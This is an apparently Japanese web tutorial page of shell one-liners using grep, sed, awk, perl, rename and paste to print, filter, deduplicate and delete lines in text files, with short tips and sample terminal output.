</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doc04.txt | sed 'n;n;n;n;G;'
Advanced Bash-Scripting Guide
An in-depth exploration of the art of shell scripting
Mendel Cooper
&lt;thegrendel.abs@gmail.com&gt;
10

10 Mar 2014
Revision History
Revision 6.5    05 Apr 2012    Revised by: mc
'TUNGSTENBERRY' release
Revision 6.6    27 Nov 2012    Revised by: mc

'YTTERBIUMBERRY' release
Revision 10    10 Mar 2014    Revised by: mc
'PUBLICDOMAIN' release
This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts.
This book is suitable for classroom use as a general introduction to programming concepts.

This document is herewith granted to the Public Domain. No copyright!
bash-3.2$
</code></pre><h2 id=ファイル操作>ファイル操作</h2>
<h3 id=rename-すべてのファイルの名前を変更します>rename すべてのファイルの名前を変更します</h3>
<p>(たとえば、すべての .gz ファイルから ABC を削除します)。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>rename <span class=s1>&#39;s/ABC//&#39;</span> *.gz
</code></pre></div><h3 id=rename-すべてのファイルにファイル拡張子を追加します-例-txt-を追加>rename すべてのファイルにファイル拡張子を追加します (例: .txt を追加)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>rename s/$/.txt/ *
</code></pre></div><h3 id=paste-ファイルの行を並べて結合>paste ファイルの行を並べて結合</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:hello.txt data-lang=:hello.txt>Hello, world.
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-:hello02.txt data-lang=:hello02.txt>Welcome to Japan.
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat hello.txt
Hello, world.
bash-3.2$ cat hello02.txt
Welcome to Japan.
bash-3.2$ paste hello.txt hello02.txt
Hello, world.    Welcome to Japan.
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>paste</code>コマンドは複数のファイルを横に並べて結合します。</dd>
</dl>
</div>
<h3 id=paste-2つ以上のファイルを列に結合貼り付けます-例-fileafilebfilec>paste 2つ以上のファイルを列に結合/貼り付けます (例: fileA、fileB、fileC)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>paste fileA fileB fileC
</code></pre></div><h3 id=perl-各ファイル名の文字列の名前の部分aaaをbbbに変更します>perl 各ファイル名の文字列の名前の部分aaaをbbbに変更します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ls <span class=p>|</span> perl -ne <span class=s1>&#39;chomp; next unless -e; $o = $_; s/aaa/bbb/; next if -e; rename $o, $_&#39;</span><span class=p>;</span>
</code></pre></div><h2 id=条件出力>条件出力</h2>
<h3 id=head-sed-awk-最初の-10-行を出力>head sed awk 最初の 10 行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>head
head -n10
sed 10q
awk <span class=s1>&#39;NR &lt; 11&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=awk-文字列を含む行出力しない-例-bbo>awk 文字列を含む行出力しない (例: &lsquo;bbo&rsquo;)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat file <span class=p>|</span> awk <span class=s1>&#39;!/bbo/&#39;</span>
</code></pre></div><h3 id=head-sed-awk-最初の行を出力>head sed awk 最初の行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>head -1
sed q
awk <span class=s1>&#39;NR&gt;1{exit};1&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=tail-sed-最後の-10-行を出力>tail sed 最後の 10 行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tail
tail -n10
sed -e :a -e <span class=s1>&#39;$q;N;11,$D;ba&#39;</span>
</code></pre></div><h3 id=tail-sed-awk-最後の-2-行を出力>tail sed awk 最後の 2 行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tail -2
sed <span class=s1>&#39;$!N;$!D&#39;</span>
awk <span class=s1>&#39;{y=x &#34;\n&#34; $0; x=$0};END{print y}&#39;</span>
</code></pre></div><h3 id=tail-sed-awk-最後の行を出力>tail sed awk 最後の行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tail -1
sed <span class=s1>&#39;$!d&#39;</span>
sed -n <span class=s1>&#39;$p&#39;</span>
awk <span class=s1>&#39;END{print}&#39;</span>
</code></pre></div><h3 id=sed-最終行の次の行を出力>sed 最終行の次の行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -e <span class=s1>&#39;$!{h;d;}&#39;</span> -e x              <span class=c1># for 1-line, print blank line</span>
sed -e <span class=s1>&#39;1{$q;}&#39;</span> -e <span class=s1>&#39;$!{h;d;}&#39;</span> -e x  <span class=c1># for 1-line, print the line</span>
sed -e <span class=s1>&#39;1{$d;}&#39;</span> -e <span class=s1>&#39;$!{h;d;}&#39;</span> -e x  <span class=c1># for 1-line, print nothing</span>
</code></pre></div><h3 id=sed-最後に列を追加>sed 最後に列を追加</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=k>for</span> i in <span class=k>$(</span>ls<span class=k>)</span><span class=p>;</span><span class=k>do</span> sed -i <span class=s2>&#34;s/</span>$<span class=s2>/\t</span><span class=nv>$i</span><span class=s2>/&#34;</span> <span class=nv>$i</span><span class=p>;</span><span class=k>done</span>
</code></pre></div><h2 id=条件検索正規表現>条件検索・正規表現</h2>
<h3 id=grep-sed-awk-正規表現に一致する行のみを出力>grep sed awk 正規表現に一致する行のみを出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>grep <span class=s1>&#39;regex&#39;</span>
sed -n <span class=s1>&#39;/regex/p&#39;</span>           <span class=c1># method 1</span>
sed <span class=s1>&#39;/regex/!d&#39;</span>             <span class=c1># method 2</span>
awk <span class=s1>&#39;/regex/&#39;</span>
</code></pre></div><h3 id=grep-sed-awk-正規表現に一致しない行のみを出力>grep sed awk 正規表現に一致しない行のみを出力:</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>grep -v regex
sed -n <span class=s1>&#39;/regex/!p&#39;</span>          <span class=c1># method 1, corresponds to above</span>
sed <span class=s1>&#39;/regex/d&#39;</span>              <span class=c1># method 2, simpler syntax</span>
awk <span class=s1>&#39;!/regex/&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>grep -v</code> は基本です。</dd>
</dl>
</div>
<h3 id=grep-空行をカウントする>grep 空行をカウントする</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename.txt <span class=p>|</span> grep -c <span class=s2>&#34;^</span>$<span class=s2>&#34;</span>
</code></pre></div><p>または、</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename.txt <span class=p>|</span> grep <span class=s2>&#34;^</span>$<span class=s2>&#34;</span> <span class=p>|</span> wc -l
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>wc -l</code>は、行数をカウントする<code>wc</code>コマンドです。</dd>
<dd><code>^$</code>の <code>^</code> は行頭、 <code>$</code>は行末、いわゆる行頭と行末の間になにもない、それは空白行と意味します。</dd>
<dd>空白行を<code>wc -l</code>でカウントするということになります。</dd>
</dl>
</div>
<h3 id=grep-単語とマッチしない行を表示-例-bbo>grep 単語とマッチしない行を表示 (例: &lsquo;bbo&rsquo;)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename.txt <span class=p>|</span> grep -v bbo
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>-v</code>は、「ではない（マッチしない）」という意味になります。</dd>
</dl>
</div>
<h3 id=grep-一致する行番号を返す-検索文字列は例-bbo>grep 一致する行番号を返す 検索文字列は(例: &lsquo;bbo&rsquo;)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename.txt <span class=p>|</span> grep -c bbo
</code></pre></div><h3 id=grep-特定の文字列で始まらない行を表示-例->grep 特定の文字列で始まらない行を表示 (例: #)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename.txt <span class=p>|</span> grep -v <span class=s1>&#39;^#&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>^</code>は行頭という意味です。</dd>
</dl>
</div>
<h3 id=grep-大文字と小文字を区別しない-grep-例-bbobbobbo>grep 大文字と小文字を区別しない grep (例: &lsquo;bbo&rsquo;/&lsquo;BBO&rsquo;/&lsquo;Bbo&rsquo;)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename.txt <span class=p>|</span> grep -i <span class=s2>&#34;bbo&#34;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>こちらのオプションもよく使われます。</dd>
</dl>
</div>
<h3 id=grep-マッチに色を付けます-例-bbo>grep マッチに色を付けます (例: &lsquo;bbo&rsquo;)!</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename.txt <span class=p>|</span> grep --color bbo
</code></pre></div><p>以下の2行を ~/.bashrc に追記して保存しておくと常に<code>grep</code>コマンドがカラー表示となります。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:~/.bashrc data-lang=bash:~/.bashrc><span class=nb>alias</span> <span class=nv>grep</span><span class=o>=</span><span class=s1>&#39;grep --color=auto&#39;</span>
<span class=nb>alias</span> <span class=nv>egrep</span><span class=o>=</span><span class=s1>&#39;egrep --color=auto&#39;</span>
<span class=nb>alias</span> <span class=nv>fgrep</span><span class=o>=</span><span class=s1>&#39;fgrep --color=auto&#39;</span>
<span class=nb>alias</span> <span class=nv>ls</span><span class=o>=</span><span class=s1>&#39;ls -FG&#39;</span><span class=p>;</span> 
</code></pre></div><h3 id=sed-特定の行を出力-例-123-行目>sed 特定の行を出力 (例: 123 行目)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n -e <span class=s1>&#39;123p&#39;</span>
</code></pre></div><h3 id=sed-行数を出力します-例-10-行目から-33-行目>sed 行数を出力します (例: 10 行目から 33 行目)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -n <span class=s1>&#39;10,33p&#39;</span>
</code></pre></div><h3 id=sed-n行ごとに出力する>sed n行ごとに出力する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -n <span class=s1>&#39;0~3p&#39;</span> 
</code></pre></div><h3 id=sed-奇数行ごとに出力>sed 奇数行ごとに出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -n <span class=s1>&#39;1~2p&#39;</span>
</code></pre></div><h3 id=sed-最初の行を含めて-3-行ごとに出力する>sed 最初の行を含めて 3 行ごとに出力する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed -n <span class=s1>&#39;1p;0~3p&#39;</span>
</code></pre></div><h3 id=sed-awk-正規表現の直前の行を出力>sed awk 正規表現の直前の行を出力</h3>
<p>正規表現を含む行は出力しません:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;/regex/{g;1!p;};h&#39;</span>
awk <span class=s1>&#39;/regex/{print x};{x=$0}&#39;</span>
awk <span class=s1>&#39;/regex/{print (NR==1 ? &#34;match on line 1&#34; : x)};{x=$0}&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=sed-awk-正規表現の直後の行を出力>sed awk 正規表現の直後の行を出力</h3>
<p>正規表現を含む行は出力しません:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;/regex/{n;p;}&#39;</span>
awk <span class=s1>&#39;/regex/{getline;print}&#39;</span>
</code></pre></div><h3 id=grep-sed-正規表現の前後１行のコンテキストを行番号付きで出力>grep sed 正規表現の前後１行のコンテキストを行番号付きで出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>grep -A1 -B1 -n regex
sed -n -e <span class=s1>&#39;/regex/{=;x;1!p;g;$!N;p;D;}&#39;</span> -e h
</code></pre></div><h3 id=sed-awk-aaa-と-bbb-と-ccc-を検索します-任意の順序で>sed awk AAA と BBB と CCC を検索します (任意の順序で):</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/AAA/!d; /BBB/!d; /CCC/!d&#39;</span>
awk <span class=s1>&#39;/AAA/ &amp;&amp; /BBB/ &amp;&amp; /CCC/&#39;</span>
</code></pre></div><h3 id=sed-awk-aaabbbcccこの順序でを含む行を検索します>sed awk AAA、BBB、CCC(この順序で)を含む行を検索します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/AAA.*BBB.*CCC/!d&#39;</span>
awk <span class=s1>&#39;/AAA.*BBB.*CCC/&#39;</span>
</code></pre></div><h3 id=egrep-grep-sed-aaabbbまたはcccを検索します>egrep grep sed AAA、BBBまたはCCCを検索します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>egrep <span class=s2>&#34;AAA|BBB|CCC&#34;</span>
grep -E <span class=s2>&#34;AAA|BBB|CCC&#34;</span>
sed -e <span class=s1>&#39;/AAA/b&#39;</span> -e <span class=s1>&#39;/BBB/b&#39;</span> -e <span class=s1>&#39;/CCC/b&#39;</span> -e d    <span class=c1># most seds</span>
gsed <span class=s1>&#39;/AAA\|BBB\|CCC/!d&#39;</span>                        <span class=c1># GNU sed only</span>
</code></pre></div><h3 id=sed-aaaが含まれている段落を出力>sed AAAが含まれている段落を出力</h3>
<p>(空白行で段落を区切ります):</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -e <span class=s1>&#39;/./{H;$!d;}&#39;</span> -e <span class=s1>&#39;x;/AAA/!d;&#39;</span>
</code></pre></div><h3 id=sed-段落aaaに-bbbとccc任意の順序でが含まれている段落を出力>sed 段落AAAに BBBとCCC(任意の順序で)が含まれている段落を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -e <span class=s1>&#39;/./{H;$!d;}&#39;</span> -e <span class=s1>&#39;x;/AAA/!d;/BBB/!d;/CCC/!d&#39;</span>
</code></pre></div><h3 id=sed-gsed-aaabbbまたはcccが含まれている段落を出力>sed gsed AAA、BBBまたはCCCが含まれている段落を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -e <span class=s1>&#39;/./{H;$!d;}&#39;</span> -e <span class=s1>&#39;x;/AAA/b&#39;</span> -e <span class=s1>&#39;/BBB/b&#39;</span> -e <span class=s1>&#39;/CCC/b&#39;</span> -e d
gsed <span class=s1>&#39;/./{H;$!d;};x;/AAA\|BBB\|CCC/b;d&#39;</span>
</code></pre></div><h3 id=sed-awk-65-文字以上の行を出力>sed awk 65 文字以上の行を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;/^.\{65\}/p&#39;</span>
awk <span class=s1>&#39;length &gt; 64&#39;</span>
</code></pre></div><h3 id=sed-awk-65-文字未満の行のみを出力>sed awk 65 文字未満の行のみを出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;/^.\{65\}/!p&#39;</span>        <span class=c1># method 1, corresponds to above</span>
sed <span class=s1>&#39;/^.\{65\}/d&#39;</span>            <span class=c1># method 2, simpler syntax</span>
awk <span class=s1>&#39;length &lt; 65&#39;</span>
</code></pre></div><h3 id=sed-awk-正規表現から最後までのセクションを出力>sed awk 正規表現から最後までのセクションを出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;/regex/,$p&#39;</span>
awk <span class=s1>&#39;/regex/,0&#39;</span>
awk <span class=s1>&#39;/regex/,EOF&#39;</span>
</code></pre></div><h3 id=sed-awk-perl-行番号に基づいてセクションを出力>sed awk perl 行番号に基づいてセクションを出力</h3>
<p>(8 行目から 12 行目まで):</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;8,12p&#39;</span>
sed <span class=s1>&#39;8,12!d&#39;</span>
awk <span class=s1>&#39;NR==8,NR==12&#39;</span>
perl -ne <span class=s1>&#39;print if 8 .. 12&#39;</span>
perl -pe <span class=s1>&#39;exit if 8&lt;$. &amp;&amp; $.&lt;12&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=sed-awk-行番号-52-を出力>sed awk 行番号 52 を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;52p&#39;</span>
sed <span class=s1>&#39;52!d&#39;</span>
sed <span class=s1>&#39;52q;d&#39;</span>
awk <span class=s1>&#39;NR==52&#39;</span>
awk <span class=s1>&#39;NR==52 {print;exit}&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=gsed-sed-３行目から-７行ごとに出力>gsed sed ３行目から ７行ごとに出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>gsed -n <span class=s1>&#39;3~7p&#39;</span>
sed -n <span class=s1>&#39;3,${p;n;n;n;n;n;n;}&#39;</span>
</code></pre></div><h3 id=sed-awk-perl-2-つの正規表現の間のセクションを出力>sed awk perl 2 つの正規表現の間のセクションを出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;/START/,/END/p&#39;</span>
awk <span class=s1>&#39;/START/,/END/&#39;</span>
perl -ne <span class=s1>&#39;print if /START/ .. /END/&#39;</span>
perl -ne <span class=s1>&#39;print if m{START} .. m{END}&#39;</span>
</code></pre></div><h3 id=sed-perl-2-つの正規表現の間のセクションを除くすべてを出力>sed perl 2 つの正規表現の間のセクションを除くすべてを出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/START/,/END/d&#39;</span>
perl -i.old -ne <span class=s1>&#39;print unless /START/ .. /END/&#39;</span>
</code></pre></div><h3 id=awk-列を正規表現と照合>awk 列を正規表現と照合</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;$7  ~ /^[a-f]/&#39;</span>
awk <span class=s1>&#39;$7 !~ /^[a-f]/&#39;</span>
</code></pre></div><h3 id=awk-５番目の列が条件にあっていれば出力>awk ５番目の列が条件にあっていれば出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;$5 == &#34;abc123&#34;&#39;</span>
</code></pre></div><h3 id=awk-５番目の列が条件にあっていなければ出力>awk ５番目の列が条件にあっていなければ出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;$5 != &#34;abc123&#34;&#39;</span>
awk <span class=s1>&#39;!($5 == &#34;abc123&#34;)&#39;</span>
</code></pre></div><h2 id=重複の扱い>重複の扱い</h2>
<h3 id=uniq-sed-awk-重複する連続した行を削除します>uniq sed awk 重複する連続した行を削除します。</h3>
<p>一連の重複行の最初の行は保持され、残りは削除されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>uniq
sed <span class=s1>&#39;$!N; /^\(.*\)\n\1$/!P; D&#39;</span>
awk <span class=s1>&#39;a !~ $0; {a=$0}&#39;</span>
</code></pre></div><h3 id=sed-awk-重複が連続していない行を削除>sed awk 重複が連続していない行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;G; s/\n/&amp;&amp;/; /^\([ -~]*\n\).*\n\1/d; s/\n//; h; P&#39;</span>
awk <span class=s1>&#39;!a[$0]++&#39;</span>
awk <span class=s1>&#39;!($0 in a){a[$0];print}&#39;</span>
</code></pre></div><h3 id=uniq-sed-重複する行を除くすべての行を削除>uniq sed 重複する行を除くすべての行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>uniq -d
sed <span class=s1>&#39;$!N; s/^\(.*\)\n\1$/\1/; t; D&#39;</span>
</code></pre></div><h2 id=行削除>行削除</h2>
<h3 id=tail-awk-最初の行を削除>tail awk 最初の行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>tail -n +2
awk <span class=s1>&#39;NR &gt; 1&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=sed-awk-perl-最初の-10-行を削除>sed awk perl 最初の 10 行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;1,10d&#39;</span>
awk <span class=s1>&#39;NR &gt; 10&#39;</span>
perl -ne <span class=s1>&#39;print unless 1 .. 10&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=awk-sed-5-行目を削除>awk sed 5 行目を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;NR != 5&#39;</span>
sed <span class=s1>&#39;5d&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=awk-sed-5から10-といった範囲の行を削除>awk sed 5から10 といった範囲の行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;NR &lt; 5 || NR &gt; 10&#39;</span>
sed <span class=s1>&#39;5,10d&#39;</span>
</code></pre></div><p>参考：NR（行番号）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11  1
12  13  1
14  15  1
16  17  1
18  19  1
20  21  1
bash-3.2$ cat calc02.txt | awk '{ print NR}'
1
2
3
4
5
6
bash-3.2$
</code></pre><h3 id=sed-最後の行を削除します>sed 最後の行を削除します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;$d&#39;</span>
</code></pre></div><h3 id=sed-最後の-2-行を削除します>sed 最後の 2 行を削除します</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;N;$!P;$!D;$d&#39;</span>
</code></pre></div><h3 id=sed-最後の-10-行を削除します>sed 最後の 10 行を削除します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -e :a -e <span class=s1>&#39;$d;N;2,10ba&#39;</span> -e <span class=s1>&#39;P;D&#39;</span>   
sed -n -e :a -e <span class=s1>&#39;1,10!{P;N;D;};N;ba&#39;</span> 
</code></pre></div><h3 id=gsed-sed-8-行ごとに削除します>gsed sed 8 行ごとに削除します</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>gsed <span class=s1>&#39;0~8d&#39;</span>                           
sed <span class=s1>&#39;n;n;n;n;n;n;n;d;&#39;</span>                
</code></pre></div><h3 id=sed-パターンに一致する行を削除>sed パターンに一致する行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/pattern/d&#39;</span>
</code></pre></div><h3 id=grep-sed-awk-空行をすべて削除>grep sed awk 空行をすべて削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>grep -v ^$
grep <span class=s1>&#39;.&#39;</span>
sed <span class=s1>&#39;/^$/d&#39;</span>                           
sed <span class=s1>&#39;/./!d&#39;</span>                          
awk NF
awk <span class=s1>&#39;/./&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>grep -v "^$"</code> をパイプで組み合わせて使うことが一般的ですが、<code>sed '/^$/d'</code> を覚えておくと、以降の理解が進むと思います。</dd>
</dl>
</div>
<h3 id=cat-sed-最初の空白行を除く連続する空白行を削除し先頭と末尾のすべての空白行も削除>cat sed 最初の空白行を除く連続する空白行を削除し、先頭と末尾のすべての空白行も削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat -s
<span class=c1># method 1, allows 0 blanks at top, 1 at EOF</span>
sed <span class=s1>&#39;/./,/^$/!d&#39;</span>   
<span class=c1># method 2, allows 1 blank at top, 0 at EOF</span>
sed <span class=s1>&#39;/^$/N;/\n$/D&#39;</span> 
</code></pre></div><h3 id=sed-最初の-2-行を除く連続する空白行をすべて削除>sed 最初の 2 行を除く連続する空白行をすべて削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/^$/N;/\n$/N;//D&#39;</span>
</code></pre></div><h3 id=sed-先頭の空白行をすべて削除>sed 先頭の空白行をすべて削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/./,$!d&#39;</span>
</code></pre></div><h3 id=sed-末尾の空白行をすべて削除>sed 末尾の空白行をすべて削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -e :a -e <span class=s1>&#39;/^\n*$/{$d;N;ba&#39;</span> -e <span class=s1>&#39;}&#39;</span>
sed -e :a -e <span class=s1>&#39;/^\n*$/N;/\n$/ba&#39;</span>
</code></pre></div><h3 id=sed-各段落の最後の行を削除>sed 各段落の最後の行を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;/^$/{p;h;};/./{x;/./p;}&#39;</span>
</code></pre></div><h3 id=sed-文字列を含む行を削除-例-bbo>sed 文字列を含む行を削除 (例: &lsquo;bbo&rsquo;)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed <span class=s1>&#39;/bbo/d&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>sed '/regex/d'</code> の d オプションは delete（消す）という意味となります。</dd>
</dl>
</div>
<h3 id=sed-1行目を削除>sed 1行目を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed 1d 
</code></pre></div><h3 id=sed-最初の１００行１行目から１００行目までを削除>sed 最初の１００行（１行目から１００行目まで）を削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed 1,100d 
</code></pre></div><h3 id=sed-空行の削除>sed 空行の削除</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> grep -v <span class=s2>&#34;^</span>$<span class=s2>&#34;</span>
</code></pre></div><p>または、</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat filename <span class=p>|</span> sed <span class=s1>&#39;/^$/d&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>このパターンは必ず身につけましょう。</dd>
</dl>
</div>
